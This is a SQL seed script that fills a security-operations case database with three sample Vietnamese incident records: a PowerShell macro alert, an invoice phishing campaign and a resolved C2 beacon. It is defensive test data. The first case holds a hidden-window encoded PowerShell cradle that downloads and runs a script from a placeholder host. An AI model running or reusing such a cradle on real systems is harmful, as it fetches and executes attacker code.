-- Re-seed SOC sample data by replacing original 3 cases with high-fidelity Vietnamese records.

-- Clean up any existing records of these specific IDs to make re-run idempotent and clean
DELETE FROM case_shares WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM case_procedures WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM case_logs WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM task_items WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM observables WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM alerts WHERE id IN ('20000000-0000-0000-0000-000000000001'::uuid, '20000000-0000-0000-0000-000000000002'::uuid, '20000000-0000-0000-0000-000000000003'::uuid) OR case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM cases WHERE id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);

INSERT INTO cases (
    id, number, title, description, severity, tlp, pap, status, owner, assignee, tags,
    start_date, end_date, flag, summary, impact_status, resolution_status, case_template,
    owning_organisation, organisation_ids, created_at, updated_at
)
VALUES
    (
        '10000000-0000-0000-0000-000000000001'::uuid, 11,
        'Phát hiện PowerShell mã hóa đáng ngờ trên máy trạm người dùng',
        '## Phân tích sự cố
Hệ thống EDR phát hiện một tiến trình PowerShell chứa mã hóa Base64 (`-EncodedCommand`) được khởi chạy bởi tiến trình Microsoft Word (`winword.exe`) trên máy trạm của nhân viên phòng ban Hành chính. Đây là dấu hiệu điển hình của kỹ thuật tấn công Macro độc hại (Malicious Macro).

### Thông tin kỹ thuật từ EDR:
- **Hostname**: NCS-HR-LAP05
- **IP Address**: 192.168.10.88
- **OS Version**: Windows 11 Enterprise
- **Process Tree**: `outlook.exe` -> `winword.exe` -> `powershell.exe`
- **CommandLine**: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQUtAGMAaABlAGMAawAuAGUAeABhAG0AcABsAGUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=`
- **Decoded Command**: `IEX (New-Object Net.WebClient).DownloadString(''http://cdn-update-check.example/update.ps1'')`

### Actions Required:
- Cô lập máy trạm khỏi mạng nội bộ.
- Trích xuất lịch sử duyệt web và các file Word được mở gần đây từ Outlook.
- Kiểm tra tính toàn vẹn của PowerShell logs.',
        3, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '',
        ARRAY['edr','powershell','endpoint','attack:T1059'],
        now() - interval '1 day', NULL::timestamptz, true,
        'Điều tra tiến trình PowerShell mã hóa đáng ngờ trên máy trạm người dùng.',
        'NoImpact', 'Indeterminate', 'Endpoint Malware Triage',
        'NCS SOC', ARRAY['NCS SOC','IT Operations'], now() - interval '1 day', now() - interval '18 minutes'
    ),
    (
        '10000000-0000-0000-0000-000000000002'::uuid, 12,
        'Chiến dịch Phishing giả mạo hóa đơn nhắm vào bộ phận Tài chính',
        '## Phân tích sự cố
Hệ thống giám sát Email Gateway ghi nhận nhiều tài khoản email thuộc phòng ban Tài chính nhận được thư điện tử giả mạo cổng thanh toán Microsoft 365, chứa liên kết thu thập thông tin tài khoản (Credential Harvesting). Một nhân viên đã nhấp vào liên kết và có dấu hiệu gửi yêu cầu đổi mật khẩu bất thường.

### Thông tin kỹ thuật từ Email Gateway:
- **Alert Source**: Microsoft Defender for Office 365
- **Sender Address**: `billing-update@login-microsoft-security.example`
- **Email Subject**: "[NCS-Finance] Yêu cầu cập nhật thông tin hóa đơn dịch vụ Cloud Q1/2026"
- **Phishing URL**: `https://login-microsoft-security.example/finance/invoice?campaign=april`
- **Affected Target**: `finance-dept@ncsgroup.vn`

### Actions Required:
- Chặn khẩn cấp domain `login-microsoft-security.example` trên Web Gateway và DNS.
- Force reset mật khẩu và thu hồi active session của các nhân viên đã tương tác với email.
- Rà soát log đăng nhập Azure AD xem có hành vi đăng nhập bất hợp pháp từ IP lạ.',
        2, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '',
        ARRAY['phishing','m365','finance','tlp:amber'],
        now() - interval '2 days', NULL::timestamptz, true,
        'Chiến dịch Phishing giả mạo Microsoft 365: chặn URL, reset mật khẩu các tài khoản bị ảnh hưởng.',
        'WithImpact', 'Indeterminate', 'Phishing - Standard Triage',
        'NCS SOC', ARRAY['NCS SOC','Finance'], now() - interval '2 days', now() - interval '35 minutes'
    ),
    (
        '10000000-0000-0000-0000-000000000003'::uuid, 13,
        'Cảnh báo kết nối máy chủ điều khiển C2 đã được xử lý thành công',
        '## Phân tích sự cố
Hệ thống Proxy phát hiện một máy trạm trong mạng nội bộ cố gắng thiết lập kết nối HTTPS tuần kỳ tới một tên miền độc hại đã được định danh là Command and Control (C2) server.

### Thông tin kỹ thuật từ Proxy:
- **Hostname**: NCS-DEV-PC12
- **Internal IP**: 10.0.8.44
- **C2 Domain**: `cdn-update-check.example`
- **Alert Rule**: SWG-4421-C2 (Secure Web Gateway C2 Connection Alert)
- **Status**: Host isolated, IOC blocked, no additional beaconing observed.

### Kết quả điều tra & Xử lý:
- Máy trạm đã được cô lập tạm thời để quét offline bằng EDR.
- Phát hiện và gỡ bỏ key registry khởi chạy độc hại của mã độc.
- Hệ thống đã an toàn, máy trạm được kết nối mạng trở lại sau khi xác nhận sạch mã độc.',
        1, 2, 2, 'Resolved', 'nghia.dinh@ncsgroup.vn', 'certuser@thehive.local',
        ARRAY['malware','proxy','c2','resolved'],
        now() - interval '7 days', now() - interval '2 days', false,
        'Xử lý thành công cảnh báo kết nối C2: cô lập máy trạm, chặn IOC, gỡ bỏ registry persistence.',
        'NoImpact', 'TruePositive', 'Malware Callback Triage',
        'NCS SOC', ARRAY['NCS SOC','IT Operations'], now() - interval '7 days', now() - interval '2 days'
    );

INSERT INTO alerts (
    id, title, type, source, source_ref, severity, tlp, pap, status, read, follow,
    flag, description, external_link, organisation_id, case_template, case_id,
    tags, occurred_at, last_sync_date, created_at, updated_at
)
VALUES
    (
        '20000000-0000-0000-0000-000000000001'::uuid,
        'Cảnh báo EDR: Phát hiện tiến trình con powershell.exe chạy mã hóa đáng ngờ được sinh ra bởi winword.exe',
        'edr', 'Microsoft Defender', 'MDE-6F3A-2219', 3, 2, 2, 'New', false, true, true,
        'Cảnh báo EDR: Phát hiện tiến trình con powershell.exe chạy mã hóa đáng ngờ được sinh ra bởi tiến trình mẹ winword.exe kèm tham số Command Base64.',
        'https://edr.local/alerts/MDE-6F3A-2219', 'NCS SOC', 'Endpoint Malware Triage',
        '10000000-0000-0000-0000-000000000001'::uuid, ARRAY['edr','powershell','attack:T1059'],
        now() - interval '1 day 1 hour', now() - interval '15 minutes', now() - interval '1 day', now() - interval '15 minutes'
    ),
    (
        '20000000-0000-0000-0000-000000000002'::uuid,
        'Sự kiện từ MISP: Phát hiện chiến dịch Phishing giả mạo hóa đơn tài chính Microsoft 365',
        'misp-event', 'MISP', 'MISP-2026-0427-091', 2, 2, 2, 'Imported', false, true, true,
        'Sự kiện từ MISP: Phát hiện chiến dịch Phishing giả mạo cổng thanh toán hóa đơn Microsoft 365. Đã tự động liên kết vào case phòng Tài chính.',
        'https://misp.local/events/view/91', 'NCS SOC', 'Phishing - Standard Triage',
        '10000000-0000-0000-0000-000000000002'::uuid, ARRAY['misp','phishing','finance'],
        now() - interval '2 days 2 hours', now() - interval '30 minutes', now() - interval '2 days 1 hour', now() - interval '30 minutes'
    ),
    (
        '20000000-0000-0000-0000-000000000003'::uuid,
        'Cảnh báo Proxy: Phát hiện kết nối đến tên miền C2 độc hại đã được định danh',
        'proxy', 'Secure Web Gateway', 'SWG-4421-C2', 1, 2, 2, 'Imported', true, false, false,
        'Cảnh báo Proxy: Phát hiện máy trạm kết nối HTTPS tuần kỳ tới tên miền Command & Control độc hại. Tiến hành xử lý sau khi cô lập máy trạm.',
        'https://proxy.local/search?q=SWG-4421-C2', 'NCS SOC', 'Malware Callback Triage',
        '10000000-0000-0000-0000-000000000003'::uuid, ARRAY['proxy','c2','resolved'],
        now() - interval '7 days 1 hour', now() - interval '2 days', now() - interval '7 days', now() - interval '2 days'
    );

INSERT INTO observables (
    id, case_id, data_type, data, message, tlp, ioc, sighted, ignore_similarity,
    full_data, data_hash, organisation_ids, tags, created_by, created_at, updated_at
)
VALUES
    (
        '30000000-0000-0000-0000-000000000001'::uuid,
        '10000000-0000-0000-0000-000000000002'::uuid, 'url',
        'https://login-microsoft-security.example/finance/invoice',
        'Đường dẫn thu thập thông tin tài khoản (Credential Harvesting) trích xuất từ nội dung email phishing.', 2, true, true, false,
        'https://login-microsoft-security.example/finance/invoice?campaign=april',
        'sha256:2b4d9f54a7a2d9d843f8c9b1f2ad0b87b2a7d2d7b547a7f7aa1f9bba0d0c0001',
        ARRAY['NCS SOC','Finance'], ARRAY['url','phishing','m365'], 'nghia.dinh@ncsgroup.vn',
        now() - interval '2 days', now() - interval '35 minutes'
    ),
    (
        '30000000-0000-0000-0000-000000000002'::uuid,
        '10000000-0000-0000-0000-000000000001'::uuid, 'filename',
        'powershell.exe -EncodedCommand SQBFAFgA...',
        'Lệnh PowerShell mã hóa Base64 đáng ngờ phát hiện từ log tiến trình EDR.', 2, true, false, true,
        'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA...',
        'sha256:2b4d9f54a7a2d9d843f8c9b1f2ad0b87b2a7d2d7b547a7f7aa1f9bba0d0c0002',
        ARRAY['NCS SOC','IT Operations'], ARRAY['powershell','endpoint','attack:T1059'], 'soc-l2@ncsgroup.vn',
        now() - interval '1 day', now() - interval '18 minutes'
    ),
    (
        '30000000-0000-0000-0000-000000000003'::uuid,
        '10000000-0000-0000-0000-000000000003'::uuid, 'domain',
        'cdn-update-check.example',
        'Tên miền C2 đã biết phát hiện từ log Proxy; đã bị chặn tại cổng Gateway và DNS.', 2, true, true, false,
        'cdn-update-check.example',
        'sha256:2b4d9f54a7a2d9d843f8c9b1f2ad0b87b2a7d2d7b547a7f7aa1f9bba0d0c0003',
        ARRAY['NCS SOC','IT Operations'], ARRAY['domain','c2','resolved'], 'certuser@thehive.local',
        now() - interval '7 days', now() - interval '2 days'
    );

INSERT INTO task_items (case_id, title, description, status, flag, assignee, group_name, order_index, start_date, due_date, organisation_ids, created_at, updated_at)
VALUES
    ('10000000-0000-0000-0000-000000000001'::uuid, 'Xác thực lệnh PowerShell mã hóa', 'Giải mã câu lệnh Base64 và đối chiếu với các mẫu khởi chạy mã độc đã biết.', 'InProgress', true, 'soc-l2@ncsgroup.vn', 'Investigation', 1, now() - interval '20 hours', now() + interval '2 hours', ARRAY['NCS SOC','IT Operations'], now() - interval '1 day', now() - interval '18 minutes'),
    ('10000000-0000-0000-0000-000000000002'::uuid, 'Kiểm tra Header Email', 'Xác thực bản ghi SPF/DKIM/DMARC và phân tích hạ tầng gửi thư giả mạo.', 'InProgress', true, 'nghia.dinh@ncsgroup.vn', 'Triage', 1, now() - interval '2 days', now() + interval '4 hours', ARRAY['NCS SOC','Finance'], now() - interval '2 days', now() - interval '40 minutes'),
    ('10000000-0000-0000-0000-000000000002'::uuid, 'Tổng hợp danh sách người nhận bị ảnh hưởng', 'Xác nhận danh sách tài khoản bị nhắm mục tiêu và kiểm tra xem có tài khoản nào đã đăng nhập hoặc lộ mật khẩu.', 'Waiting', false, '', 'Triage', 2, NULL::timestamptz, now() + interval '8 hours', ARRAY['NCS SOC','Finance'], now() - interval '2 days', now() - interval '1 hour'),
    ('10000000-0000-0000-0000-000000000003'::uuid, 'Ghi nhận kết quả cô lập & xử lý', 'Lưu trữ thông tin chặn Proxy/DNS, trạng thái cô lập máy trạm và xác nhận không còn mã độc tồn tại.', 'Completed', false, 'certuser@thehive.local', 'Closure', 1, now() - interval '6 days', now() - interval '2 days', ARRAY['NCS SOC','IT Operations'], now() - interval '7 days', now() - interval '2 days');
